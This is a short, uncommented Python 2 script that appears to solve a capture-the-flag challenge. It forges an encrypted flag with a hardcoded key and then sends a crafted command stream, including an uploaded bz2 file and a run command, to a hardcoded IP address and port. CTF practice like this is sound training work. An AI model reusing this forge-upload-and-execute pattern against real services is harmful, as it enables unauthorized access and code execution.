import socket
import sys
import time

def xor_str(s1, s2):
    return ''.join([chr(ord(s1[x]) ^ ord(s2[x])) for x in xrange(len(s1)) ])

def sub_str(s1, s2):
    return ''.join([chr((ord(s1[x]) - ord(s2[x])) & 0xFF) for x in xrange(len(s1)) ])

compute_flag_cmd = '\x01\x00\x20'
bz_data = open('test.bz2', 'rb').read()
write_bz_cmd = '\x02\x00' + chr(len(bz_data))
write_tmp_cmd = '\x03\x00\x00'
last_login_cmd = '\x08\x00\x00'
check_flag_cmd = '\x04\x00\x00'
run_cmd = '\x05\x00\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.65.162.169', 8888))

key = '\xeb\x22\x42\x8f\x7f\xff\xf9\x0a'
flag = '\x59\x4F\x5F\x44\x41\x4E\x42\x49\x5F\x43\x52\x45\x57\x5F\x49\x4E\x5F\x54\x48\x45\x5F\x48\x4F\x55\x53\x45\x2E\x05\x05\x05\x05\x05'
blocks = []

blocks.append(xor_str(flag[-8:], key))
blocks.append(xor_str(sub_str(flag[-16:-8], key), blocks[-1]))
blocks.append(xor_str(sub_str(flag[-24:-16], key), blocks[-1]))
blocks.append(xor_str(sub_str(flag[-32:-24], key), blocks[-1]))
encflag = ''.join(reversed(blocks))

payload = compute_flag_cmd
payload += encflag
payload += write_bz_cmd
payload += bz_data
payload += write_tmp_cmd
payload += check_flag_cmd
payload += run_cmd

s.send(payload)
s.shutdown(socket.SHUT_WR)
while True:
    st = s.recv(1)
    if len(st) == 0:
        break
    sys.stdout.write(st)
print ''

